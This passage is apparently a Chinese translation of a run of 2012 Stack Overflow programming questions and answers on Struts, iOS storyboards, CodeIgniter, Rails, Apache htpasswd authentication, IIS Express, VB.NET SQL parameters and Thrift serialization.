> 
> 时间：2012-09-08T07:19:21.943
> 
> 标签：struts2, struts1

我想知道如何创建 java web 应用程序的设置文件或可执行文件，其中我使用 Struts 和 jsp 在 net beans 7.1.2 IDE 中进行开发。所以请帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T05:51:07.963

下载 excelsior 并将您的 Java EE Web 项目作为 example.exe 文件运行

```
http://www.excelsior-usa.com/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-09T16:41:10.563

您需要 stuts 插件（类似于[netbeans 的 struts2 插件](http://plugins.netbeans.org/plugin/23467/netbeans-struts2-support)）

您可以找到许多如何使用 struts 创建 Web 应用程序的示例，例如 this

*   [示例 1](http://devtalks.blogspot.com/2009/07/create-struts2-project-in-netbeans.html)
*   [示例 2](http://beans.seartipy.com/2008/07/30/hello-world-web-application-using-struts-2-in-netbeans-ide-61/)

# uistoryboard - 过渡到故事板

> ID：12328855
> 
> 赞同：0
> 
> 时间：2012-09-08T07:20:01.523
> 
> 标签：uistoryboard, ios5

我有一个包含多个 xib 的项目，并且由于我正在为 iOS 5 API 开发，我想过渡到情节提要。我找不到任何关于这件事的教程，只有关于用故事板打开一个**新**项目的教程。

**有没有办法在没有**xibs的项目中完全过渡到只有故事板并且**不**为此打开新项目？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T08:36:32.347

~> 这将对你有所帮助。

[从 XIB 文件转换到 Storyboard](https://stackoverflow.com/questions/7798400/transitioning-from-xib-files-to-storyboard)

~> 还有看看这个 Apple 的文档。

[转换为 Storyboard 发行说明](http://developer.apple.com/library/ios/#releasenotes/Miscellaneous/RN-AdoptingStoryboards/_index.html)

# ios - 在 UIImagePickerController 委托中识别不同的选择器

> ID：12328859
> 
> 赞同：2
> 
> 时间：2012-09-08T07:20:32.797
> 
> 标签：ios, properties, delegates, uiimagepickercontroller

我有一个带有几个按钮的视图，用于呈现 UIImagePickerControllers（相机和媒体选择器）。当我创建 UIImagePickerControllers 时，我给它们起不同的名称并以模态方式呈现它们，如下面的代码所示：

```
- (void) startMediaBrowserFromViewControllerForBGImage {
    UIImagePickerController * mediaUIForBGImage = [[UIImagePickerController alloc]init];
    //i also set a bunch of different settings here, but it doesn't matter for this purpose
    mediaUIForBGImage.delegate = self;
    [self presentModalViewController: mediaUIForBGImage animated:YES];
} 
```

现在您也可以在代码中看到，我将委托设置为`self`，这就是我对所有 UIImagePickerController 所做的事情，但问题是 - 在委托方法中，我如何知道哪个 UIImagePickerController 调用了委托方法。因为对于每个 UIImagePickerControllers，我需要对媒体执行的操作都不同。在委托方法中，我确实获得了`UIImagePickerController`参数，但它始终具有从方法（选择器）分配的名称。我可以用什么来知道要引用哪个 UIImagePickerController？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:37:32.773

您的一个解决方案可能是这样的：

如果您设置`tag`各种选择器的“”值，则发送给委托方法的参数之一将包括导致委托方法触发的选择器，如果您查看`tag`它的“”值，您将知道哪个选择器。

另一种解决方案可能是将每个选择器设置为一个 ivar 或一个属性，然后比较发送到委托方法的选择器参数以查看哪个等于哪个 ivar 或属性（即对象地址是否相同？）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T07:40:47.610

我认为您可以存储对每个选择器的引用，然后检查它是否是同一个实例。虽然我会质疑使用多个不同的选择器实例，但你可以只配置一个吗？此外，它们在任何配置中返回几乎相同的结果，您可以调查结果字典以满足特定需求。

```
self.oneImagePicker = [UIImagePickerController ...]
self.twoImagePicker = [UIImagePickerController ...]

//In delegate
if ([self.oneImagePicker isEqual:picker]) ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-11T11:48:52.777

您可以在委托中锻炼您正在处理的选择器 - 例如检查标签属性 - 或创建一个 UIPopoverController 子类来驱动您的弹出框并使其成为 ImagePicker 的委托。它将需要将选定的信息传递回主类 - 您可以通过实现 popoverControllerShouldDismissPopover 委托方法并检查子类的属性来做到这一点

# php - Amazon EC2 上的 CodeIgniter 应用程序显示空白页

> ID：12328863
> 
> 赞同：1
> 
> 时间：2012-09-08T07:21:29.473
> 
> 标签：php, mysql, codeigniter, amazon-ec2

我的 CodeIgniter 应用程序在 Amazon 实例上运行。我也创建了所需的数据库（在 MySQL 上）。

当我尝试使用亚马逊弹性 IP/Appname 访问它时，我曾经得到**空白页。**

我检查了我的 index.php，认为它没有加载控制器。但是在`index`我的默认控制器的功能中，我做了一个简单的`echo "Hello!";`，结果很好！

但我实际上在索引函数中加载了我的数据库，并通过模型进行了大量查询。

因此问题一定出在数据库上。虽然我不能把手指放在它上面。我如何摆脱这些空白页？

有什么帮助吗？？

提前致谢..

PS：相同的应用程序在 localhost 上运行，没有任何其他更改。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T09:11:15.307

问题已解决。

首先，我用 PHP ( `sudo apt-get install mysql-server libapache2-mod-auth-mysql php5-mysql`)重新安装了 MySQL

然后我不得不在 database.php 上更改 MySQL 的登录设置。:)

# javascript - 提交 HTML 表单后将用户重定向到父页面

> ID：12328865
> 
> 赞同：0
> 
> 时间：2012-09-08T07:21:31.157
> 
> 标签：javascript, forms, internet-explorer

我需要禁用“表单发布警告后重定向”对话框。
与以下问题相同：
[在 POST 后重新加载浏览器窗口而不提示用户重新发送 POST 数据](https://stackoverflow.com/questions/4869721/reload-browser-window-after-post-without-prompting-user-to-resend-post-data)

但就我而言，我从颜色框对话框提交表单。提交表单后，我关闭颜色框弹出窗口并重新加载父页面：

```
 parent.location.reload(); 
```

但这给出了警告。我怎样才能禁用它？

**编辑：**显然我在 Internet Explorer 中收到重新发布表单警告。我没有从其他浏览器获得它。

```
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET4.0C; InfoPath.2) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T11:56:47.690

```
parent.location.href = parent.location.href; 
```

# android - 即使没有移动，Motionevent Action_MOVE 也会继续触发 X 和 Y

> ID：12328867
> 
> 赞同：4
> 
> 时间：2012-09-08T07:21:34.793
> 
> 标签：android, motionevent

我正在尝试一个简单的程序，它在移动时会发出声音。所以一开始我就失败了——它播放声音 1，从那时起它的每一个动作都在播放声音。在计数 4 时，我已经让它从头开始播放。

这是问题所在：当我不移动手指并将其保持在同一位置时，声音仍保持 1 比 1 - 计算出 x 和 y 值触发。我该如何阻止这个？

```
OnTouchListener MyOnTouchListener= new OnTouchListener()
{
public boolean onTouch(View view, MotionEvent event)
    {
    switch(event.getAction() & MotionEvent.ACTION_MASK)
        {

         case MotionEvent.ACTION_DOWN:
           x = (int) event.getX();
            y = (int) event.getY();    
            oldval = x+y;
            break;

    case MotionEvent.ACTION_MOVE:
        {
          Log.e("X value", "X is "+x);
          Log.e("Y value", "Y is "+y);
        try 
            {
                Thread.sleep(500);
            } catch (InterruptedException e) {
            }

            int newval= (int) (event.getX() + event.getY()); 

            if(Math.abs(oldval-newval)>50)
            {

                Log.e("First", "next button");
                longpressCount++;
                if(longpressCount==1)
                {
                   Log.e("1", "BUTTON PRESSED");
                }
                else if(longpressCount==2)
                {
                    Log.e("2", "BUTTON PRESSED");
                }
                else if(longpressCount==3)
                {
                    Log.e("3", "BUTTON PRESSED");
                }
                else if(longpressCount==4)
                {
                    Log.e("4", "BUTTON PRESSED");
                    longpressCount = 0;
                }

            }

            break;
         }
        }
        return true;
    } 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-08T07:58:40.133

MOVE 非常敏感，只要您的手指向下，就会继续调用。在声音播放代码的末尾设置旧值，这样它只会在距离该位置再移动 50 距离时播放。

像这样的东西。

```
OnTouchListener MyOnTouchListener= new OnTouchListener()
{
public boolean onTouch(View view, MotionEvent event)
    {
    switch(event.getAction() & MotionEvent.ACTION_MASK)
        {

         case MotionEvent.ACTION_DOWN:
           x = (int) event.getX();
            y = (int) event.getY();    
            oldval = x+y;
            break;

    case MotionEvent.ACTION_MOVE:
        {
          Log.e("X value", "X is "+x);
          Log.e("Y value", "Y is "+y);
        try 
            {
                Thread.sleep(500);
            } catch (InterruptedException e) {
            }

            int newval= (int) (event.getX() + event.getY()); 

            if(Math.abs(oldval-newval)>50)
            {

                Log.e("First", "next button");
                longpressCount++;
                if(longpressCount==1)
                {
                   Log.e("1", "BUTTON PRESSED");
                }
                else if(longpressCount==2)
                {
                    Log.e("2", "BUTTON PRESSED");
                }
                else if(longpressCount==3)
                {
                    Log.e("3", "BUTTON PRESSED");
                }
                else if(longpressCount==4)
                {
                    Log.e("4", "BUTTON PRESSED");
                    longpressCount = 0;
                }
                oldval = event.getX() + event.getY();
            }

            break;
         }
        }
        return true;
    } 
```

# jquery - 如何检查用户电子邮件的唯一性并将结果传递给 jQuery？

> ID：12328873
> 
> 赞同：0
> 
> 时间：2012-09-08T07:22:37.273
> 
> 标签：jquery, ruby-on-rails, ruby, validation

我有这个问题：我正在控制器中检查用户电子邮件并成功发送 json 响应，如果它已经被采用并添加输入的 css 样式，我还需要阻止提交并添加一些消息。

这是我的检查电子邮件操作（使用这篇文章 - [http://paydrotalks.com/posts/45-standard-json-response-for-rails-and-jquery](http://paydrotalks.com/posts/45-standard-json-response-for-rails-and-jquery)）：

```
def checkemail
  if !User.where('email = ?', params[:email]).empty?
    format.jsonr do
      render :json => { 
        :status => :ok, 
        :message => "Success!",
      }.to_json
    end
  end
end 
```

在我的路线中：

```
 checkemail GET    /checkemail(.:format)

          match "/checkemail", to: 'edit_user#checkemail' 
```

和我的 jQuery：

```
 $('#user_email').focusout(function() {
    $.getJSON('/checkemail', { email: $('#user_email').val() }, function(data) {
        $('#user_email').addClass("error");
      });
   }); 
```

我的 HTML 输入代码：

```
 <input id="user_email" name="user[email]" size="30" type="email" value=""> 
```

来自 mime_type 初始化程序文件：

```
 Mime::Type.register_alias "application/json", :jsonr, %w( text/x-json ) 
```

**从提琴手：**

```
 Request : GET /checkemail?user@mail.com HTTP/2.0

  Response(RAW tab) : 
  Missing template edit_user/checkemail

  JSON tab is empty 
```

**问题：如何检查是否发送了 json 请求？如何防止提交表单并添加一些消息？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T16:14:02.690

我会这样做：

```
$('#element').focusout(function() {
  $.getJSON('PATH_TO_EMAIL_CHECK_ACTION', { email: $('#element').val() }, function(data) {
    // The data should tell you if its unique or not, you do something
    // here depending on response 
  });
}); 
```

在控制器中，检查电子邮件是否被占用。如果不是，则发送回渲染 json，状态为 OK，消息成功。您可以在上面评论的回调中检查状态是否成功。

jquery focusout - [http://api.jquery.com/focusout/](http://api.jquery.com/focusout/)

jquery getJSON - [http://api.jquery.com/jQuery.getJSON/](http://api.jquery.com/jQuery.getJSON/)

关于控制器中的 json 响应 - [http://paydrotalks.com/posts/45-standard-json-response-for-rails-and-jquery](http://paydrotalks.com/posts/45-standard-json-response-for-rails-and-jquery)

# php - 文档末尾的 XML 额外内容（使用 PHP SimpleXML）

> ID：12328874
> 
> 赞同：0
> 
> 时间：2012-09-08T07:22:39.783
> 
> 标签：php, mysql, xml, xml-parsing

我想使用相应区域的邮政编码创建一个用于搜索属性的应用程序，并在谷歌地图上找到它们。我正在测试谷歌的教程以使用 PHP/MySql 的地图，但停留在 XML 中。它给了我这个错误：-此页面包含以下错误：

第 2 行第 1 列的错误：文档末尾的额外内容 下面是第一个错误之前的页面呈现。

这是代码：

```
 <?php
$username="root";
$password="";
$database="test";

// Start XML file, create parent node
$dom = new DOMDocument("1.0");
$node = $dom->createElement("markers");
$parnode = $dom->appendChild($node);

// Opens a connection to a MySQL server
$connection=mysql_connect ('localhost', $username, $password);
if (!$connection) {
  die('Not connected : ' . mysql_error());
}

// Set the active MySQL database
$db_selected = mysql_select_db($database, $connection);
if (!$db_selected) {
  die ('Can\'t use db : ' . mysql_error());
}

// Select all the rows in the markers table
$query = "SELECT * FROM markers";
$result = mysql_query($query);
if (!$result) {
  die('Invalid query: ' . mysql_error());
}

header("Content-type: text/xml");

// Iterate through the rows, adding XML nodes for each
while ($row = @mysql_fetch_assoc($result)){
  // ADD TO XML DOCUMENT NODE
  $node = $dom->createElement("marker");
  $newnode = $parnode->appendChild($node);
  $newnode->setAttribute("name", $row['name']);
  $newnode->setAttribute("address", $row['address']);
  $newnode->setAttribute("lat", $row['lat']);
  $newnode->setAttribute("lng", $row['lng']);
  $newnode->setAttribute("distance", $row['distance']);
}

$smd=$dom->saveXML();
echo $smd;

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T13:27:14.203

大多数情况下，当没有看到 XML 根元素或不唯一时，就会出现此错误！

在您的情况下：我猜您的 XML 创建因 die() 而失败，并且您解析此 PHP 输出的外部脚本不会将其识别为有效的 XML？！

StasGrin 上面的评论也可能是一个好点：最后删除前面的空白！两者都会呈现空白，但这也会导致 PHP 错误/警告：

```
Warning: Cannot modify header information - headers already sent by (output started at …) in … 
```

# asp.net - 如何让 transparentAtStart 参数在 Firefox 或 Chrome 中工作？

> ID：12328876
> 
> 赞同：0
> 
> 时间：2012-09-08T07:22:54.730
> 
> 标签：asp.net

我正在尝试在我的 aspx 页面中嵌入视频。一切正常。通过设置，视频不会立即启动`autostart=false`。

现在我想显示一个固定的初始图像来代替黑屏。在 IE 中，我通过设置`transparentAtStart=true`和一些 JavaScript 代码来做到这一点。我希望在 Firefox 和 Chrome 中做同样的事情，但两者似乎都不理解`transparentAtStart`标签。

我正在使用 .mwv 插件播放 .wmv 文件。在用户点击播放之前，有没有其他方法可以显示固定的初始图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-05T08:21:32.727

您可以为图像使用[HTML 5 视频海报属性](http://www.w3schools.com/html5/att_video_poster.asp)。

```
<video poster="/images/poster.jpg" autostart="false">
    <!-- sources -->
</video> 
```

# java - Java中是否有任何“void”可以参与的语句？

> ID：12328877
> 
> 赞同：1
> 
> 时间：2012-09-08T07:23:07.023
> 
> 标签：java, jvm

Java中是否有任何“void”（带有小v，从方法返回）可以参与的语句？

例如，似乎甚至不可能在`voidMe() instanceof Void`哪里做：

`void voidMe(){...}`.

（出于好奇，这是一个理论问题。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T07:27:44.903

是的 - 一个简单的方法调用：

```
voidMe(); 
```

那是一个声明。

如果你的意思是一个*表达式*，那么

```
voidMe() 
```

仍然是一个表达式 - 只是一个结果什么都没有的表达式。从[JLS 的第 15.1 节](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.1)：

> 当程序中的表达式被求值（执行）时，结果表示以下三种情况之一：
> 
> *   变量（第 4.12 节）（在 C 中，这称为左值）
>     
>     
> *   一个值（§4.2，§4.3）
>     
>     
> *   什么都没有（据说表达式是无效的）
>     
>     
> 
> ...
> 
> 当且仅当表达式是调用不返回值的方法的方法调用（第 15.12 节），即声明为 void 的方法（第 8.4 节）时，表达式什么都不表示。**这样的表达式只能用作表达式语句（第 14.8 节），因为表达式可以出现的所有其他上下文都需要表达式来表示某些东西。**

突出显示的部分基本上说明了表达式的*唯一*用途，例如`voidMe()`方法调用。没有“更大”的表达可以`voidMe()`作为它的一部分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T07:27:34.473

在 Java 中，`void`不是类型或对象。因此，它不能成为“表达式”的一部分。

表达式中的任何运算符或函数都将使用其参数作为输入。但是，由于 void 不是有效类型，并且不存在 void 类型的对象，因此无法计算表达式。

因此，任何 void 函数本身都必须是一个语句。

您也不能创建 的实例`Void`，因为“Void 类是不可实例化的占位符类”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T07:47:36.320

Void 是不可实例化的，因此你不能在任何地方使用它的值。（说真的，你想什么都不做？你怎么可能有一个什么都没有的实例？）

但是，您可以将 Void 声明为类型参数。如果您想使用 java.concurrent 包中的某些类，这是必要的。例如，您需要声明 Future<Void> 以便将 void 方法提交到执行器服务。然后，您可以在一个地方询问结果，该结果将是 Void 类型。此结果始终为空。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-08T07:36:35.630

我从[Java 规范 §8.4.2复制](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.4.5)

> 当且仅当以下条件成立时，具有返回类型 R [1]的方法声明 d [1]可以返回类型*替换*为具有返回类型 R [2]的另一个方法 d [2 ：]
> 
>  **   如果R [1]是，`void`那么R [2]是`void`。*

 *它可以被 Class literals [Java Specification §15.8.2 使用](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.8.2)

> `void.class`( [§8.4.5](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.4.5) )的类型是`Class<Void>`.
> ...
> 类文字评估为由当前实例的类的定义类加载器定义`Class`的命名类型（或 for ）的对象。`void`*

# php - 现在（）; 和日期（）；代码点火器中的函数给出零结果

> ID：12328882
> 
> 赞同：2
> 
> 时间：2012-09-08T07:24:13.143
> 
> 标签：php, codeigniter

所以我想将当前时间插入 mysql 数据库，这是我的代码：

```
'regis_date'=>$this->input->post(date('Y-m-d H:i:s', now())) 
```

但结果是这样的：`0000-00-00 00:00:00` 我想要的是这样的（例如）：`2012-08-31 00:00:00` 谢谢：D

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:30:26.310

试试这个代码

```
'regis_date'=>'NOW()' 
```

**编辑**
使用这个。. 它确实有效。.

```
'regis_date'=>date("Y-m-d H:i:s") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T07:41:31.793

[`$this->input->post`](http://codeigniter.com/user_guide/libraries/input.html)用于检索通过表单发布的数据。

例如：

```
<input type="text" name="regis_date" /> 
```

可以这样检索：

```
$this->input->post('regis_date'); 
```

传递日期`$this->input->post`没有任何意义。你想要的是：

```
'regis_date' => date('Y-m-d H:i:s', now()) 
```

或者正如 zerkms 正确地评论的那样：

```
'regis_date' => date('Y-m-d H:i:s') 
```

# php - 需要用户名和密码

> ID：12328883
> 
> 赞同：3
> 
> 时间：2012-09-08T07:24:33.573
> 
> 标签：php, apache, .htaccess, .htpasswd

*如果这个问题是noobish或一种重复，请相应地指导我。*

我想知道如何实现这种身份验证？

![在此处输入图像描述](../Images/d4313844efc790d0839e387c54f949c4.png)

我问是因为我很迷茫，不知道要搜索哪些关键字。在我看来，我计划在用户想要访问我的域时使用它（例如[http://mysite.com](http://mysite.com)和[http://mysite.com/tools](http://mysite.com/tools)）。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-08T07:27:34.800

您要查找的关键字是：`htaccess`, `htpasswd`, `.htaccess`。（假设你使用 apache）

最终，您会将`.htaccess`文件放在要保护的目录中，并让它检查您的`htpasswd`文件的要求。

例如：在我的服务器上，我不希望人们看到我的`private`目录。

```
$ sudo htpasswd -c /etc/apache2/.htpasswd benjamin 
```

**请注意**，`benjamin`在上面的命令中，^ 是我们将用于登录的用户名。

`.htpasswd`为了安全起见，我们希望该文件位于我们的 web 文件夹之外。

然后在我的`private`目录中，我会放置一个`.htaccess`包含以下内容的文件：

```
AuthUserFile /etc/apache2/.htpasswd
AuthGroupFile /dev/null
AuthName Authenticate
AuthType Basic
require user benjamin 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T07:30:00.693

它被称为 HTTP 身份验证

[http://en.wikipedia.org/wiki/Basic_access_authentication](http://en.wikipedia.org/wiki/Basic_access_authentication)

[http://php.net/manual/en/features.http-auth.php](http://php.net/manual/en/features.http-auth.php)

发送`WWW-Authenticate`标头以提示进行身份验证

```
<?php header('WWW-Authenticate: Basic realm="My Realm"');?> 
```

身份验证凭据将在以下`$_SERVER`变量中可用

用户名 -`$_SERVER['PHP_AUTH_USER']` 密码 -`$_SERVER['PHP_AUTH_PW']`

确认用户名和密码，如果不匹配，则发送`HTTP/1.0 401 Unauthorized`状态失败或再次发送`WWW-Authenticate`标题以再次提示。

正如本杰明所说，你也可以使用 auth 模块

[http://httpd.apache.org/docs/2.2/howto/auth.html#gettingitworking](http://httpd.apache.org/docs/2.2/howto/auth.html#gettingitworking)

# ruby-on-rails - 无法获取要保存的嵌套属性

> ID：12328888
> 
> 赞同：0
> 
> 时间：2012-09-08T07:24:45.730
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, nested-attributes

模型：

```
class User < ActiveRecord::Base
  attr_accessible :soundcloud_access_token, :soundcloud_expires_at, :soundcloud_refresh_token, :soundcloud_user_id, :soundcloud_username, :photo

  has_one :photo
  accepts_nested_attributes_for :photo 
```

看法：

```
=form_for :user, :url => user_path(@user), :method => :put, :class => 'form-horizontal' do |f|
  %legend Edit Profile
  =f.fields_for :photo do |photo|
    %div.control-group
      =photo.label :image
      %div.controls
        =photo.file_field :image
  =f.submit 'Submit' 
```

控制器：

```
 def update
    @user = User.find(params[:id])
    @user.update_attributes(params[:user])
    redirect_to @user
  end 
```

参数：

```
{"utf8"=>"✓", "_method"=>"put", "authenticity_token"=>"nqxi4QKr7g7j0xO41lZqCHvQrGHSd7AXqxEZyskxag8=", "user"=>{"photo"=>{"image"=>#<ActionDispatch::Http::UploadedFile:0xb1d442a0 @original_filename="Dark-Evil-41694.jpg", @content_type="image/jpeg", @headers="Content-Disposition: form-data; name=\"user[photo][image]\"; filename=\"Dark-Evil-41694.jpg\"\r\nContent-Type: image/jpeg\r\n", @tempfile=#<File:/tmp/RackMultipart20120908-8454-qgtagx>>}}, "commit"=>"Submit", "action"=>"update", "controller"=>"users", "id"=>"1"} 
```

错误：

```
Photo(#-646360948) expected, got ActiveSupport::HashWithIndifferentAccess(#76750090) 
```

我到底做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T08:56:32.247

采用

`:photo_attributes`而不是`:photo`在`attr_accessible`

```
attr_accessible :soundcloud_access_token, :soundcloud_expires_at, :soundcloud_refresh_token, :soundcloud_user_id, :soundcloud_username, :photo_attributes 
```

还有这个（发问者萨莫本人的这个解决方案:)）

`:photo_attributes`而不是`:photo`在`fields_for`

*我不需要这个 step rails 3.2 ，来自问题的 Samo 版本在 3.2 中效果很好*

文档中的更多详细信息

[http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html#method-i-fields_for](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html#method-i-fields_for)

[http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html#label-Using+with+attr_accessible](http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html#label-Using+with+attr_accessible)

# javascript - 表单提交作为 HTML 中的弹出窗口

> ID：12328889
> 
> 赞同：0
> 
> 时间：2012-09-08T07:24:46.230
> 
> 标签：javascript, html, css

我正在尝试将表单提交到页面作为弹出窗口。我尝试了以下链接中的解决方案。

[如何将 HTML 表单提交到禁用调整大小的弹出窗口？](https://stackoverflow.com/questions/660810/how-do-i-submit-an-html-form-to-a-popup-windows-with-resize-disabled)

它在 Chrome 和 IE 上运行良好，但在 Mozilla 上失败。我能知道为什么以及如何解决这个问题吗？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T08:02:05.057

您的问题是您将表单命名为其他名称，但从未在 javascript 中提及它。以下对我有用：

```
process = function() {
    window.open('about:blank', 'popup', 'width=320,height=240,resizeable=no');
    document.startChat.setAttribute('target', 'popup');
    document.startChat.setAttribute('onsubmit', '');
    document.startChat.submit();
} 
```

# .htaccess - htaccess：重定向到同一页面，但查询字符串值不同

> ID：12328891
> 
> 赞同：1
> 
> 时间：2012-09-08T07:25:01.610
> 
> 标签：.htaccess, mod-rewrite, query-string

我有一个带有查询字符串的页面，我想将其重定向到具有不同查询字符串值的同一页面：

`www.mysite.com/pages/page.php?id=5`（这是旧页面）
`www.mysite.com/pages/page.php?id=7`（这是需要重定向到的新页面）

```
RewriteEngine on

RewriteCond %{QUERY_STRING} ^id=5$ [NC]

RewriteRule ^pages/page\.php$ pages/page.php?id=7 [R=301,L] 
```

它不起作用。有人可以帮助我吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T07:49:40.133

```
RewriteEngine on

RewriteCond %{QUERY_STRING} ^id=5$ [NC]

RewriteRule ^pages/page\.php$   http://%{HTTP_HOST}/pages/page.php?id=7 [R=301,L,NC] 
```

# vmware - 在 VMWare Win7 上访问 IIS Express

> ID：12328892
> 
> 赞同：0
> 
> 时间：2012-09-08T07:25:05.107
> 
> 标签：vmware, remote-access, iis-express

我正在使用 VMWare 的 Windows 7 虚拟机上的 VS2012 中运行 ASP.NET MCV 4 项目。我希望能够从我的 mac 访问该站点。

我已经完成了[这个](https://stackoverflow.com/questions/5442551/iisexpress-returns-a-503-error-from-remote-machines)问题中所述的所有步骤。重新启动 IIS，关闭 Windows 防火墙，更改应用程序配置文件并授予对 ACL 的远程访问权限，但我的 mac 中仍然出现 503 错误。

我可能错过的任何步骤？

应用程序配置文件如下：

```
 <site name="prototype" id="2">
            <application path="/" applicationPool="Clr4IntegratedAppPool">
                <virtualDirectory path="/" physicalPath="C:\Users\Igor Popov\Desktop\myapp\prototype" />
            </application>
            <bindings>
                <binding protocol="http" bindingInformation=":50438:192.168.0.9" />
            </bindings>
        </site> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-18T10:00:38.527

1.编辑 applicationhost.config 文件，您的站点绑定应如下所示；

```
<binding protocol="http" bindingInformation="*:50438:localhost" /> 
```

2.以管理员身份运行你的VS。

3.在您的 Mac 中使用“localhost:50438”访问该站点。

# asp.net - vb.net插入查询错误

> ID：12328893
> 
> 赞同：0
> 
> 时间：2012-09-08T07:25:17.943
> 
> 标签：asp.net, sql, vb.net

变量 Itemtext 已声明。为什么会出现这个错误？？

```
Try
        conn = New SqlConnection(connString)
        conn.Open()
        Dim i As Integer = 0
        Using cmd As New SqlCommand()
            For Each c In item
                cmd.Connection = conn
                cmd.CommandType = CommandType.Text
                cmd.CommandText = "INSERT INTO tblItems(Item,Numberof) Values (@Itemtext,@Numberof)"
                cmd.Parameters.AddWithValue("@Itemtext", c)
                cmd.Parameters.AddWithValue("@Numberof", num(i))
                cmd.ExecuteNonQuery()
                i = i + 1
            Next
        End Using 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T07:27:27.400

因为您每次都在循环中添加参数

```
 Using cmd As New SqlCommand() 
      cmd.Connection = conn 
      cmd.CommandType = CommandType.Text 
      cmd.CommandText = "INSERT INTO tblItems(Item,Numberof) Values (@Itemtext,@Numberof)" 
      Dim ItemParameter As SqlParameter = cmd.Parameters.Add("@Itemtext",SqlDbType.VarChar)
      Dim NumberParameter As SqlParameter  = cmd.Parameters.Add("@Numberof", SqlDbType.Int) 
      For Each c In item 
            ItemParameter.Value = c
            NumberParameter.Value = num(i)
            cmd.ExecuteNonQuery() 
            i = i + 1 
      Next 
    End Using 
```

# c++ - Thrift：是否可以只使用 C++ Thrift 库进行序列化？

> ID：12328896
> 
> 赞同：10
> 
> 时间：2012-09-08T07:25:30.750
> 
> 标签：c++, serialization, thrift

使用 C++ Apache Thrift 库，是否可以只使用序列化/反序列化而不使用 RPC 服务？

正如我从[这个](https://stackoverflow.com/questions/10608531/is-there-an-ipc-transport-implementation-for-thrift-or-low-latency-soa-solutio)页面所了解的那样，可以使用 Java 库。但是，我找不到 C++ 库的类似类。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-08T09:43:05.213

对的，这是可能的。Thrift 缺乏关于这个主题的文档。好吧，关于任何事情。

在这里我发现了这个：

[http://mail-archives.apache.org/mod_mbox/thrift-user/201010.mbox/%3C5EF8F634-79A2-45C4-9A04-6D96D3B7A84F@manbert.com%3E](http://mail-archives.apache.org/mod_mbox/thrift-user/201010.mbox/%3C5EF8F634-79A2-45C4-9A04-6D96D3B7A84F@manbert.com%3E)

如果不需要通过网络传输数据，我个人会使用 boost::serialization。语法清晰，支持 JSON、XML 和二进制输出/输入。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-07-26T13:47:43.640

在 c++ 中，您可以使用 TFileTransport：

```
boost::shared_ptr<TFileTransport> transport(new TFileTransport(filename));
boost::shared_ptr<TBinaryProtocol> protocol(new TBinaryProtocol(transport));
yourObj.write(protocol.get()); // to write 
```

或者

```
yourObj.read(protocol.get()); // to read 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-10-17T10:50:23.003

如果您只是想序列化为字节（无需写入文件），您可以使用`TMemoryBuffer`.

```
boost::shared_ptr<TMemoryBuffer> buffer(new TMemoryBuffer());
boost::shared_ptr<TBinaryProtocol> binaryProtcol(new TBinaryProtocol(buffer));

obj->write(binaryProtcol.get());
obj->read((binaryProtcol.get())); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-11-11T14:52:09.957

这是一个不同的邮件列表帖子，附有一些代码，展示了如何使用 thrift 序列化到 C++ 中的文件。

[http://mail-archives.apache.org/mod_mbox/thrift-user/201203.mbox/%3C90483D01-ED25-4707-9DB2-5BB3627301FC@manbert.com%3E](http://mail-archives.apache.org/mod_mbox/thrift-user/201203.mbox/%3C90483D01-ED25-4707-9DB2-5BB3627301FC@manbert.com%3E)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-03-21T01:36:21.897

我意识到这个问题是不久前提出的。我最近遇到了一个类似的用例（有一个额外的要求——将序列化的字节发送到 Kafka 集群）。这是我的[答案](https://stackoverflow.com/questions/42871143/serializing-a-thrift-struct-in-c-and-sending-it-to-kafka)，其中包含更完整的代码片段，说明了如何完成序列化和发送任务。

# ios - ARC环境下类型转换导致编译错误

> ID：12328897
> 
> 赞同：6
> 
> 时间：2012-09-08T07:25:56.097
> 
